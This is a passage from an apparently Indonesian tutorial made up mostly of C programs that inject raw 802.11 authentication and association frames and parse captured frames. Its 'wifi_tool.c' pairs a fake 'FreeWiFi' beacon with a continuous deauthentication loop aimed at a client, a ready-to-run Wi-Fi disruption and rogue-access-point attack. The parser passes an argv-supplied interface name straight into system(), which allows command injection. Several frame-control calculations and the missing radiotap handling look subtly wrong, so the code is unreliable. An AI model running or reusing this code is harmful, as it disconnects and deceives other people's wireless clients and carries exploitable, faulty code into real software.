    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    
    return sendto(sock, buf, len, 0, (struct sockaddr*)&addr, sizeof(addr));
}

// ===== BUILD AUTH REQUEST =====

int build_auth_request(uint8_t *buf, uint8_t *client_mac, uint8_t *ap_mac,
                       uint16_t algorithm, uint16_t seq, uint16_t status) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    // Frame Control: Authentication (0xB0)
    hdr->frame_control = htons(0xB0 << 4); // 0xB000
    hdr->duration = 0;
    
    // Address 1: AP MAC
    memcpy(hdr->addr1, ap_mac, 6);
    
    // Address 2: Client MAC
    memcpy(hdr->addr2, client_mac, 6);
    
    // Address 3: AP MAC (BSSID)
    memcpy(hdr->addr3, ap_mac, 6);
    
    hdr->seq_ctrl = 0;
    
    // Authentication body
    *pos++ = algorithm & 0xFF;
    *pos++ = (algorithm >> 8) & 0xFF;
    
    *pos++ = seq & 0xFF;
    *pos++ = (seq >> 8) & 0xFF;
    
    *pos++ = status & 0xFF;
    *pos++ = (status >> 8) & 0xFF;
    
    return sizeof(wifi_header_t) + 6;
}

// ===== SEND AUTH REQUEST =====

int send_auth_request(const char *iface, uint8_t *client_mac, 
                      uint8_t *ap_mac, uint16_t algorithm) {
    int sock;
    uint8_t buf[256];
    int len;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    // Sequence 1 = Request
    len = build_auth_request(buf, client_mac, ap_mac, algorithm, 1, STATUS_SUCCESS);
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);
    return ret;
}

// ===== SEND AUTH RESPONSE =====

int send_auth_response(const char *iface, uint8_t *client_mac, 
                       uint8_t *ap_mac, uint16_t status) {
    int sock;
    uint8_t buf[256];
    int len;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    // Sequence 2 = Response
    len = build_auth_request(buf, client_mac, ap_mac, AUTH_OPEN, 2, status);
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);
    return ret;
}

// ===== MAIN =====

int main(int argc, char *argv[]) {
    const char *iface = "wlan0";
    uint8_t client_mac[6] = {0};
    uint8_t ap_mac[6] = {0};
    int client_set = 0, ap_set = 0;
    int response = 0;
    uint16_t status = STATUS_SUCCESS;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-c") == 0 && i+1 < argc) {
            client_set = string_to_mac(argv[++i], client_mac);
        } else if (strcmp(argv[i], "-a") == 0 && i+1 < argc) {
            ap_set = string_to_mac(argv[++i], ap_mac);
        } else if (strcmp(argv[i], "-r") == 0) {
            response = 1;
        } else if (strcmp(argv[i], "-s") == 0 && i+1 < argc) {
            status = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-i") == 0 && i+1 < argc) {
            iface = argv[++i];
        }
    }
    
    if (!client_set || !ap_set) {
        fprintf(stderr, "Usage: %s -c <client_mac> -a <ap_mac> [-r] [-s status]\n", argv[0]);
        return 1;
    }
    
    char client_str[18], ap_str[18];
    mac_to_string(client_mac, client_str);
    mac_to_string(ap_mac, ap_str);
    
    printf("========================================\n");
    printf("  AUTH TOOL\n");
    printf("========================================\n");
    printf("Interface: %s\n", iface);
    printf("Client:    %s\n", client_str);
    printf("AP:        %s\n", ap_str);
    printf("Mode:      %s\n", response ? "Response" : "Request");
    printf("Status:    %d\n", status);
    printf("========================================\n\n");
    
    int ret;
    if (response) {
        ret = send_auth_response(iface, client_mac, ap_mac, status);
        printf("[Auth] Response sent (status: %d)\n", status);
    } else {
        ret = send_auth_request(iface, client_mac, ap_mac, AUTH_OPEN);
        printf("[Auth] Request sent\n");
    }
    
    return ret < 0 ? 1 : 0;
}
```

---

## 8. Implementasi Lengkap: `assoc.c`

```c
// assoc.c - Kirim Association Frame (Bytecode: 0x00 / 0x10)
// Compile: gcc -o assoc assoc.c
// Jalankan: sudo ./assoc -c 00:11:22:33:44:55 -a 02:11:22:33:44:55

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
    uint8_t payload[];
} __attribute__((packed)) wifi_header_t;

#define STATUS_SUCCESS 0
#define STATUS_UNSPECIFIED 1

void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int string_to_mac(const char *str, uint8_t *mac) {
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

int create_raw_socket(const char *iface) {
    int sock;
    struct ifreq ifr;
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    return sock;
}

int send_frame(int sock, const uint8_t *buf, int len, const char *iface) {
    struct sockaddr_ll addr;
    struct ifreq ifr;
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    
    return sendto(sock, buf, len, 0, (struct sockaddr*)&addr, sizeof(addr));
}

// ===== BUILD ASSOC REQUEST =====

int build_assoc_request(uint8_t *buf, uint8_t *client_mac, uint8_t *ap_mac,
                        uint16_t capability) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    // Frame Control: Association Request (0x00)
    hdr->frame_control = htons(0x00 << 4); // 0x0000
    hdr->duration = 0;
    
    memcpy(hdr->addr1, ap_mac, 6);
    memcpy(hdr->addr2, client_mac, 6);
    memcpy(hdr->addr3, ap_mac, 6);
    hdr->seq_ctrl = 0;
    
    // Association body
    *pos++ = capability & 0xFF;
    *pos++ = (capability >> 8) & 0xFF;
    
    *pos++ = 0x00; *pos++ = 0x00; // Listen Interval
    
    // SSID IE (required)
    *pos++ = 0; *pos++ = 0; // Empty SSID (wildcard)
    
    // Rates
    *pos++ = 1; *pos++ = 4;
    *pos++ = 0x82; *pos++ = 0x84;
    *pos++ = 0x8B; *pos++ = 0x96;
    
    return pos - buf;
}

// ===== BUILD ASSOC RESPONSE =====

int build_assoc_response(uint8_t *buf, uint8_t *client_mac, uint8_t *ap_mac,
                         uint16_t capability, uint16_t status, uint16_t aid) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    // Frame Control: Association Response (0x10)
    hdr->frame_control = htons(0x10 << 4); // 0x1000
    hdr->duration = 0;
    
    memcpy(hdr->addr1, client_mac, 6);
    memcpy(hdr->addr2, ap_mac, 6);
    memcpy(hdr->addr3, ap_mac, 6);
    hdr->seq_ctrl = 0;
    
    // Association body
    *pos++ = capability & 0xFF;
    *pos++ = (capability >> 8) & 0xFF;
    
    *pos++ = status & 0xFF;
    *pos++ = (status >> 8) & 0xFF;
    
    *pos++ = aid & 0xFF;
    *pos++ = (aid >> 8) & 0xFF;
    
    return pos - buf;
}

// ===== SEND ASSOC REQUEST =====

int send_assoc_request(const char *iface, uint8_t *client_mac, 
                       uint8_t *ap_mac) {
    int sock;
    uint8_t buf[256];
    int len;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    len = build_assoc_request(buf, client_mac, ap_mac, 0x0001);
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);
    return ret;
}

// ===== SEND ASSOC RESPONSE =====

int send_assoc_response(const char *iface, uint8_t *client_mac, 
                        uint8_t *ap_mac, uint16_t aid) {
    int sock;
    uint8_t buf[256];
    int len;
    
    sock = create_raw_socket(iface);
    if (sock < 0) return -1;
    
    len = build_assoc_response(buf, client_mac, ap_mac, 0x0001, 
                               STATUS_SUCCESS, aid);
    int ret = send_frame(sock, buf, len, iface);
    
    close(sock);
    return ret;
}

// ===== MAIN =====

int main(int argc, char *argv[]) {
    const char *iface = "wlan0";
    uint8_t client_mac[6] = {0};
    uint8_t ap_mac[6] = {0};
    int client_set = 0, ap_set = 0;
    int response = 0;
    uint16_t aid = 1;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-c") == 0 && i+1 < argc) {
            client_set = string_to_mac(argv[++i], client_mac);
        } else if (strcmp(argv[i], "-a") == 0 && i+1 < argc) {
            ap_set = string_to_mac(argv[++i], ap_mac);
        } else if (strcmp(argv[i], "-r") == 0) {
            response = 1;
        } else if (strcmp(argv[i], "-aid") == 0 && i+1 < argc) {
            aid = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-i") == 0 && i+1 < argc) {
            iface = argv[++i];
        }
    }
    
    if (!client_set || !ap_set) {
        fprintf(stderr, "Usage: %s -c <client_mac> -a <ap_mac> [-r] [-aid <num>]\n", argv[0]);
        return 1;
    }
    
    char client_str[18], ap_str[18];
    mac_to_string(client_mac, client_str);
    mac_to_string(ap_mac, ap_str);
    
    printf("========================================\n");
    printf("  ASSOC TOOL\n");
    printf("========================================\n");
    printf("Interface: %s\n", iface);
    printf("Client:    %s\n", client_str);
    printf("AP:        %s\n", ap_str);
    printf("Mode:      %s\n", response ? "Response" : "Request");
    printf("AID:       %d\n", aid);
    printf("========================================\n\n");
    
    int ret;
    if (response) {
        ret = send_assoc_response(iface, client_mac, ap_mac, aid);
        printf("[Assoc] Response sent (AID: %d)\n", aid);
    } else {
        ret = send_assoc_request(iface, client_mac, ap_mac);
        printf("[Assoc] Request sent\n");
    }
    
    return ret < 0 ? 1 : 0;
}
```

---

## 9. Frame Parser Lengkap

```c
// parser.c - Parse 802.11 frames (bytecode decoder)
// Compile: gcc -o parser parser.c
// Jalankan: sudo ./parser wlan0

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

// ===== HEADER 802.11 =====
typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
    uint8_t payload[];
} __attribute__((packed)) wifi_header_t;

// ===== TAG INFO =====
typedef struct {
    uint8_t tag_id;
    uint8_t length;
    uint8_t data[];
} __attribute__((packed)) ie_t;

// ===== HELPER =====

void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ===== DECODER =====

const char* get_frame_type(uint16_t fc) {
    uint8_t type = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;
    
    if (type == 0) { // Management
        switch(subtype) {
            case 0:  return "Association Request";
            case 1:  return "Association Response";
            case 2:  return "Reassociation Request";
            case 3:  return "Reassociation Response";
            case 4:  return "Probe Request";
            case 5:  return "Probe Response";
            case 8:  return "Beacon";
            case 9:  return "ATIM";
            case 10: return "Disassociation";
            case 11: return "Authentication";
            case 12: return "Deauthentication";
            case 13: return "Action";
            default: return "Unknown Management";
        }
    } else if (type == 1) { // Control
        switch(subtype) {
            case 8:  return "Block ACK Request";
            case 9:  return "Block ACK Response";
            case 10: return "PS-Poll";
            case 11: return "RTS";
            case 12: return "CTS";
            case 13: return "ACK";
            case 14: return "CF-End";
            case 15: return "CF-End + ACK";
            default: return "Unknown Control";
        }
    } else if (type == 2) { // Data
        switch(subtype) {
            case 0:  return "Data";
            case 1:  return "Data + ACK";
            case 2:  return "Data + Poll";
            case 3:  return "Data + ACK + Poll";
            case 4:  return "Null Data";
            case 5:  return "CF-ACK";
            case 6:  return "CF-Poll";
            case 7:  return "CF-ACK + Poll";
            case 8:  return "QoS Data";
            case 12: return "QoS Null Data";
            default: return "Unknown Data";
        }
    }
    return "Unknown";
}

void print_tags(uint8_t *data, int len) {
    uint8_t *pos = data;
    int remaining = len;
    
    while (remaining > 2) {
        ie_t *ie = (ie_t*)pos;
        if (ie->length > remaining - 2) break;
        
        const char *tag_name = "";
        switch(ie->tag_id) {
            case 0:  tag_name = "SSID"; break;
            case 1:  tag_name = "Supported Rates"; break;
            case 3:  tag_name = "DS Parameter Set"; break;
            case 5:  tag_name = "TIM"; break;
            case 6:  tag_name = "IBSS Parameter Set"; break;
            case 7:  tag_name = "Country"; break;
            case 36: tag_name = "Power Constraint"; break;
            case 48: tag_name = "RSN (WPA2)"; break;
            case 50: tag_name = "Extended Rates"; break;
            case 107: tag_name = "HT Capabilities"; break;
            case 127: tag_name = "HT Operation"; break;
            case 191: tag_name = "VHT Capabilities"; break;
            case 192: tag_name = "VHT Operation"; break;
            case 221: tag_name = "Vendor Specific"; break;
            default: tag_name = "Unknown";
        }
        
        printf("      IE: %s (tag=%d, len=%d)\n", tag_name, ie->tag_id, ie->length);
        
        // Print hex
        if (ie->length > 0) {
            printf("        Hex: ");
            for (int i = 0; i < ie->length && i < 16; i++) {
                printf("%02x ", ie->data[i]);
            }
            if (ie->length > 16) printf("...");
            printf("\n");
        }
        
        pos += 2 + ie->length;
        remaining -= 2 + ie->length;
    }
}

void parse_frame(uint8_t *buf, int len) {
    if (len < sizeof(wifi_header_t)) {
        printf("Frame too short: %d bytes\n", len);
        return;
    }
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint16_t fc = ntohs(hdr->frame_control);
    uint8_t type = (fc >> 2) & 0x3;
    
    char addr1_str[18], addr2_str[18], addr3_str[18];
    mac_to_string(hdr->addr1, addr1_str);
    mac_to_string(hdr->addr2, addr2_str);
    mac_to_string(hdr->addr3, addr3_str);
    
    printf("┌─────────────────────────────────────────────────────┐\n");
    printf("│ 802.11 Frame\n");
    printf("├─────────────────────────────────────────────────────┤\n");
    printf("│ Frame Control: 0x%04x\n", fc);
    printf("│ Type:          %d (%s)\n", type, get_frame_type(fc));
    printf("│ Duration:      %d\n", ntohs(hdr->duration));
    printf("│ Address 1:     %s (Destination)\n", addr1_str);
    printf("│ Address 2:     %s (Source)\n", addr2_str);
    printf("│ Address 3:     %s (BSSID)\n", addr3_str);
    printf("│ Sequence:      %d\n", ntohs(hdr->seq_ctrl) >> 4);
    printf("│ Payload:       %d bytes\n", len - sizeof(wifi_header_t));
    
    // Parse payload for management frames
    if (type == 0) {
        uint8_t *payload = hdr->payload;
        int payload_len = len - sizeof(wifi_header_t);
        uint8_t subtype = (fc >> 4) & 0xF;
        
        if (subtype == 8) { // Beacon
            printf("│\n");
            printf("│ Beacon Body:\n");
            // Timestamp (8 bytes)
            printf("│   Timestamp: ");
            for (int i = 0; i < 8; i++) printf("%02x", payload[i]);
            printf("\n");
            payload += 8;
            
            // Interval
            printf("│   Interval:  %d TU\n", payload[0] | (payload[1] << 8));
            payload += 2;
            
            // Capability
            uint16_t cap = payload[0] | (payload[1] << 8);
            printf("│   Capability: 0x%04x", cap);
            if (cap & 0x01) printf(" (ESS)");
            if (cap & 0x02) printf(" (IBSS)");
            if (cap & 0x10) printf(" (Privacy)");
            printf("\n");
            payload += 2;
            
            // Tags
            int tag_len = payload_len - 12;
            printf("│   Tags:\n");
            print_tags(payload, tag_len);
            
        } else if (subtype == 11) { // Authentication
            printf("│\n");
            printf("│ Auth Body:\n");
            uint16_t algo = payload[0] | (payload[1] << 8);
            uint16_t seq = payload[2] | (payload[3] << 8);
            uint16_t status = payload[4] | (payload[5] << 8);
            printf("│   Algorithm: %d (%s)\n", algo, 
                   algo == 0 ? "Open System" : algo == 1 ? "Shared Key" : "Unknown");
            printf("│   Sequence:  %d\n", seq);
            printf("│   Status:    %d (%s)\n", status, 
                   status == 0 ? "Success" : "Failure");
            
        } else if (subtype == 0 || subtype == 1) { // Assoc Request/Response
            printf("│\n");
            printf("│ Assoc Body:\n");
            uint16_t cap = payload[0] | (payload[1] << 8);
            printf("│   Capability: 0x%04x\n", cap);
            
            if (subtype == 1) { // Response
                uint16_t status = payload[2] | (payload[3] << 8);
                uint16_t aid = payload[4] | (payload[5] << 8);
                printf("│   Status:    %d (%s)\n", status,
                       status == 0 ? "Success" : "Failure");
                printf("│   AID:       %d\n", aid);
            }
        }
    }
    
    printf("└─────────────────────────────────────────────────────┘\n");
    printf("\n");
}

// ===== SNIFFER =====

int open_sniffer(const char *iface) {
    int sock;
    struct ifreq ifr;
    struct sockaddr_ll addr;
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(sock);
        return -1;
    }
    
    return sock;
}

// ===== MAIN =====

int main(int argc, char *argv[]) {
    const char *iface = "wlan0";
    if (argc > 1) iface = argv[1];
    
    // Setup monitor mode
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "ip link set %s down", iface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "iw dev %s set type monitor", iface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "ip link set %s up", iface);
    system(cmd);
    
    printf("┌─────────────────────────────────────────────────────┐\n");
    printf("│ 802.11 FRAME PARSER (Bytecode Decoder)            │\n");
    printf("├─────────────────────────────────────────────────────┤\n");
    printf("│ Interface: %s\n", iface);
    printf("│ Press Ctrl+C to stop\n");
    printf("└─────────────────────────────────────────────────────┘\n\n");
    
    int sock = open_sniffer(iface);
    if (sock < 0) {
        fprintf(stderr, "Failed to open sniffer\n");
        return 1;
    }
    
    uint8_t buf[2048];
    while (1) {
        int len = recv(sock, buf, sizeof(buf), 0);
        if (len < 0) {
            perror("recv");
            continue;
        }
        parse_frame(buf, len);
    }
    
    close(sock);
    return 0;
}
```

### Compile & Test:

```bash
gcc -o parser parser.c
sudo ./parser wlan0

# Output:
# ┌─────────────────────────────────────────────────────┐
# │ 802.11 Frame
# ├─────────────────────────────────────────────────────┤
# │ Frame Control: 0x8000
# │ Type:          0 (Beacon)
# │ Duration:      0
# │ Address 1:     ff:ff:ff:ff:ff:ff (Destination)
# │ Address 2:     02:11:22:33:44:55 (Source)
# │ Address 3:     02:11:22:33:44:55 (BSSID)
# │ ...
```

---

## 10. Contoh Program Full: `wifi_tool.c`

```c
// wifi_tool.c - Full WiFi Tool (beacon, probe, auth, assoc, deauth, parser)
// Compile: gcc -o wifi_tool wifi_tool.c -pthread
// Jalankan: sudo ./wifi_tool

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

// ===== HEADER 802.11 =====
typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
    uint8_t payload[];
} __attribute__((packed)) wifi_header_t;

// ===== CONFIG =====
typedef struct {
    uint8_t bssid[6];
    uint8_t client_mac[6];
    char ssid[33];
    int channel;
    char iface[16];
    int running;
} wifi_config_t;

wifi_config_t config = {
    .bssid = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55},
    .client_mac = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55},
    .ssid = "FreeWiFi",
    .channel = 6,
    .iface = "wlan0",
    .running = 1
};

// ===== UTILITY =====
void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int create_raw_socket(const char *iface) {
    int sock;
    struct ifreq ifr;
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    return sock;
}

int send_frame(int sock, const uint8_t *buf, int len, const char *iface) {
    struct sockaddr_ll addr;
    struct ifreq ifr;
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    
    return sendto(sock, buf, len, 0, (struct sockaddr*)&addr, sizeof(addr));
}

// ===== BUILD BEACON =====
int build_beacon(uint8_t *buf, wifi_config_t *cfg, uint16_t seq) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    int ssid_len = strlen(cfg->ssid);
    
    hdr->frame_control = htons(0x8000);
    hdr->duration = 0;
    memset(hdr->addr1, 0xFF, 6);
    memcpy(hdr->addr2, cfg->bssid, 6);
    memcpy(hdr->addr3, cfg->bssid, 6);
    hdr->seq_ctrl = htons(seq << 4);
    
    memset(pos, 0, 8); pos += 8;
    *pos++ = 0x64; *pos++ = 0x00;
    *pos++ = 0x01; *pos++ = 0x00;
    *pos++ = 0; *pos++ = ssid_len;
    memcpy(pos, cfg->ssid, ssid_len);
    pos += ssid_len;
    *pos++ = 1; *pos++ = 4;
    *pos++ = 0x82; *pos++ = 0x84;
    *pos++ = 0x8B; *pos++ = 0x96;
    *pos++ = 3; *pos++ = 1; *pos++ = cfg->channel;
    
    return pos - buf;
}

// ===== SEND BEACON =====
void send_beacon_loop() {
    int sock = create_raw_socket(config.iface);
    if (sock < 0) return;
    
    uint8_t buf[512];
    uint16_t seq = 0;
    
    while (config.running) {
        int len = build_beacon(buf, &config, seq++);
        send_frame(sock, buf, len, config.iface);
        usleep(100000);
    }
    
    close(sock);
}

// ===== BUILD DEAUTH =====
int build_deauth(uint8_t *buf, wifi_config_t *cfg, uint16_t seq) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    
    hdr->frame_control = htons(0xC000);
    hdr->duration = 0;
    memcpy(hdr->addr1, cfg->client_mac, 6);
    memcpy(hdr->addr2, cfg->bssid, 6);
    memcpy(hdr->addr3, cfg->bssid, 6);
    hdr->seq_ctrl = htons(seq << 4);
    
    *pos++ = 0x07;
    *pos++ = 0x00;
    
    return sizeof(wifi_header_t) + 2;
}

// ===== SEND DEAUTH =====
void send_deauth_loop() {
    int sock = create_raw_socket(config.iface);
    if (sock < 0) return;
    
    uint8_t buf[256];
    uint16_t seq = 0;
    
    while (config.running) {
        int len = build_deauth(buf, &config, seq++);
        send_frame(sock, buf, len, config.iface);
        sleep(1);
    }
    
    close(sock);
}

// ===== SIGNAL HANDLER =====
void signal_handler(int sig) {
    config.running = 0;
    printf("\n[WiFiTool] Stopping...\n");
}

// ===== MAIN =====
int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    
    char bssid_str[18], client_str[18];
    mac_to_string(config.bssid, bssid_str);
    mac_to_string(config.client_mac, client_str);
    
    printf("┌─────────────────────────────────────────────────────┐\n");
    printf("│ WIFI TOOL - 802.11 Frame Injector                │\n");
    printf("├─────────────────────────────────────────────────────┤\n");
    printf("│ SSID:       %s\n", config.ssid);
    printf("│ BSSID:      %s\n", bssid_str);
    printf("│ Client MAC: %s\n", client_str);
    printf("│ Channel:    %d\n", config.channel);
    printf("│ Interface:  %s\n", config.iface);
    printf("└─────────────────────────────────────────────────────┘\n\n");
    
    // Setup AP mode
    system("ip link set wlan0 down");
    system("iw dev wlan0 set type ap");
    system("ip link set wlan0 up");
    
    printf("[WiFiTool] Starting beacon broadcast...\n");
    printf("[WiFiTool] Press Ctrl+C to stop\n\n");
    
    // Start beacon thread
    pthread_t beacon_tid, deauth_tid;
    pthread_create(&beacon_tid, NULL, (void*)send_beacon_loop, NULL);
    pthread_create(&deauth_tid, NULL, (void*)send_deauth_loop, NULL);
    
    pthread_join(beacon_tid, NULL);
    pthread_join(deauth_tid, NULL);
    
    printf("[WiFiTool] Done!\n");
    return 0;
}
```

---

## 📊 Ringkasan Bytecode 802.11

| Frame | Opcode | Hex | Type | Subtype | Fungsi |
|-------|--------|-----|------|---------|--------|
| **Beacon** | `0x80` | `0x8000` | 0 | 8 | Broadcast SSID |
| **Probe Request** | `0x40` | `0x4000` | 0 | 4 | Cari AP |
| **Probe Response** | `0x50` | `0x5000` | 0 | 5 | Respon AP |
| **Auth Request** | `0xB0` | `0xB000` | 0 | 11 | Minta auth |
| **Auth Response** | `0xB0` | `0xB000` | 0 | 11 | Respon auth |
| **Assoc Request** | `0x00` | `0x0000` | 0 | 0 | Minta join |
| **Assoc Response** | `0x10` | `0x1000` | 0 | 1 | Respon join |
| **Deauth** | `0xC0` | `0xC000` | 0 | 12 | Putus koneksi |